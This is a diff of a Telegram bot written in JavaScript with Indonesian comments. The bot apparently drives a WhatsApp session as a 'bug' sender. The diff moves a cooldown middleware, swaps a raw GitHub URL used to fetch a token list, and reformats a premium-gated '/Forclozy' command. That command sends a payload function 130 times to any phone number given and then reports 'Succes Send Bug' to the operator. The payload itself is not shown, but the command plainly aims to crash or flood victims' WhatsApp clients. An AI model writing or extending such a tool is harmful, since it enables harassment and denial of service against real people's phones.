@@ -121,7 +121,7 @@ const ev = new EventEmitter()
 }
 
 // ------ ( Link Raw Github ) ------ //
-const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/GyzkkT/Gyzk11/refs/heads/main/token.json";
+const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/GyzkxT/Gyzk11/refs/heads/main/token.json";
 
 // ------ ( Create Safe Sock ) ------ //
 function createSafeSock(sock) {
@@ -150,94 +150,6 @@ function createSafeSock(sock) {
       try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
     }
   }
-}
-
-// ================= COOLDOWN ================= //
-
-const cooldownPath = "./cooldown.json";
-
-// otomatis buat file kalau belum ada
-if (!fs.existsSync(cooldownPath)) {
-
-  fs.writeFileSync(
-    cooldownPath,
-    JSON.stringify({
-      default: 60
-    }, null, 2)
-  );
-
-}
-
-// user cooldown sementara RAM
-const userCooldowns = {};
-
-// ================= PARSE TIME ================= //
-
-function parseTime(time) {
-
-  const match = time.match(/^(\d+)(s|m)$/i);
-
-  if (!match) return null;
-
-  const value = parseInt(match[1]);
-  const type = match[2].toLowerCase();
-
-  if (type === "s") return value;
-
-  if (type === "m") return value * 60;
-
-  return null;
-
-}
-
-// ================= MIDDLEWARE ================= //
-
-async function cooldown(ctx, next) {
-
-  if (!ctx.message || !ctx.message.text) {
-    return next();
-  }
-
-  // bypass owner
-  if (ctx.from.id == config.ID_TELEGRAM) {
-    return next();
-  }
-
-  // baca cooldown
-  const data = JSON.parse(
-    fs.readFileSync(cooldownPath)
-  );
-
-  const cooldownTime = data.default || 60;
-
-  const userId = ctx.from.id;
-
-  // buat slot user
-  if (!userCooldowns[userId]) {
-    userCooldowns[userId] = 0;
-  }
-
-  const now = Date.now();
-
-  const remaining =
-    cooldownTime -
-    Math.floor((now - userCooldowns[userId]) / 1000);
-
-  if (remaining > 0) {
-
-    return ctx.reply(
-`
-⏳ Tunggu ${remaining} detik sebelum memakai command lagi.
-`
-    );
-
-  }
-
-  // simpan waktu terakhir
-  userCooldowns[userId] = now;
-
-  return next();
-
 }
 
 // ------ ( Pengecekan Token ) ------ //
@@ -491,6 +403,95 @@ function delPremGroup(chatId) {
   savePremGroups(db);
   return true;
 }
+
+// ================= COOLDOWN ================= //
+
+const cooldownPath = "./cooldown.json";
+
+// otomatis buat file kalau belum ada
+if (!fs.existsSync(cooldownPath)) {
+
+  fs.writeFileSync(
+    cooldownPath,
+    JSON.stringify({
+      default: 60
+    }, null, 2)
+  );
+
+}
+
+// user cooldown sementara RAM
+const userCooldowns = {};
+
+// ================= PARSE TIME ================= //
+
+function parseTime(time) {
+
+  const match = time.match(/^(\d+)(s|m)$/i);
+
+  if (!match) return null;
+
+  const value = parseInt(match[1]);
+  const type = match[2].toLowerCase();
+
+  if (type === "s") return value;
+
+  if (type === "m") return value * 60;
+
+  return null;
+
+}
+
+// ================= MIDDLEWARE ================= //
+
+async function cooldown(ctx, next) {
+
+  if (!ctx.message || !ctx.message.text) {
+    return next();
+  }
+
+  // bypass owner
+  if (ctx.from.id == config.ID_TELEGRAM) {
+    return next();
+  }
+
+  // baca cooldown
+  const data = JSON.parse(
+    fs.readFileSync(cooldownPath)
+  );
+
+  const cooldownTime = data.default || 60;
+
+  const userId = ctx.from.id;
+
+  // buat slot user
+  if (!userCooldowns[userId]) {
+    userCooldowns[userId] = 0;
+  }
+
+  const now = Date.now();
+
+  const remaining =
+    cooldownTime -
+    Math.floor((now - userCooldowns[userId]) / 1000);
+
+  if (remaining > 0) {
+
+    return ctx.reply(
+`
+⏳ Tunggu ${remaining} detik sebelum memakai command lagi.
+`
+    );
+
+  }
+
+  // simpan waktu terakhir
+  userCooldowns[userId] = now;
+
+  return next();
+
+}
+
 
 // --- middleware owner only ---
 const ownerOnly = () => async (ctx, next) => {
@@ -986,9 +987,6 @@ function clearAllJobs() {
 const config = require("./config");
 
 // ================= FORCE JOIN ================= //
-
-const styles = ["Primary", "Success", "Danger"];
-let styleIndex = 0;
 
 // 🔍 cek channel belum di join
 async function getNotJoinedChannels(ctx) {
@@ -1510,49 +1508,65 @@ bot.action('/thanks_to', async (ctx) => {
 
 // ---------- ( COMMAND NO SPAM ) ---------- //
 bot.command("Forclozy", premGroupOnly(), cooldown, async (ctx) => {
+
   if (!isWhatsAppConnected) {
-    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
+    return ctx.reply(
+      "🪧 ☇ Tidak ada sender yang terhubung"
+    );
   }
 
-  const q = ctx.message.text.split(" ")[1];
+  const q =
+    ctx.message.text.split(" ")[1];
 
   if (!q) {
-    return ctx.reply("🪧 ☇ Format: /Forzlozy 628xxx");
+    return ctx.reply(
+      "🪧 ☇ Format: /Forzlozy 628xxx"
+    );
   }
 
-  const cleanNumber = q.replace(/[^0-9]/g, '');
-  const target = cleanNumber + "@s.whatsapp.net";
+  const cleanNumber =
+    q.replace(/[^0-9]/g, '');
+
+  const target =
+    cleanNumber + "@s.whatsapp.net";
 
   try {
 
-    // TAMBAHAN
+    // tambahan
     const mentions = [target];
+
     const contextInfo = {
       mentionedJid: mentions,
       participant: target,
       remoteJid: target
     };
 
-    // FUNCTION TETAP
+    // function tetap
     for (let i = 0; i < 130; i++) {
 
-      await QQSNPC_V8(sock, target, {
-        mentions,
-        contextInfo
-      });
+      await QQSNPC_V8(
+        sock,
+        target,
+        {
+          mentions,
+          contextInfo
+        }
+      );
+
+    } 
 
     await ctx.telegram.sendMessage(
       ctx.chat.id,
-      `
-✅ Succes Send Bug ( Forclozy ) To ${cleanNumber}`,
+`
+✅ Succes Send Bug ( Forclozy ) To ${cleanNumber}
+`,
       {
         parse_mode: "Markdown",
         reply_markup: {
           inline_keyboard: [[
             {
               text: "Ç̧HÈ̀Ç̧K ☇ ᎿᎯ̈ᏒᎶᎬ̀Ꮏ",
-              url: `https://wa.me/${cleanNumber}`, 
-              style: "primary"
+              url: `https://wa.me/${cleanNumber}`
             }
           ]]
         }
@@ -1565,16 +1579,15 @@ bot.command("Forclozy", premGroupOnly(), cooldown, async (ctx) => {
 
     await ctx.telegram.sendMessage(
       ctx.chat.id,
-      `
-❌ Failed Send Bug ( Forclozy ) To Target`,
+`❌ Failed Send Bug ( Forclozy ) To Target
+`,
       {
         parse_mode: "Markdown",
         reply_markup: {
           inline_keyboard: [[
             {
               text: "Ç̧HÈ̀Ç̧K ☇ ᎿᎯ̈ᏒᎶᎬ̀Ꮏ",
-              url: `https://wa.me/${cleanNumber}`, 
-              style: "danger"
+              url: `https://wa.me/${cleanNumber}`
             }
           ]]
         }
@@ -1582,6 +1595,7 @@ bot.command("Forclozy", premGroupOnly(), cooldown, async (ctx) => {
     );
 
   }
+
 });
 
 // ---------- ( ALL COMMAND BUG ) ---------- //
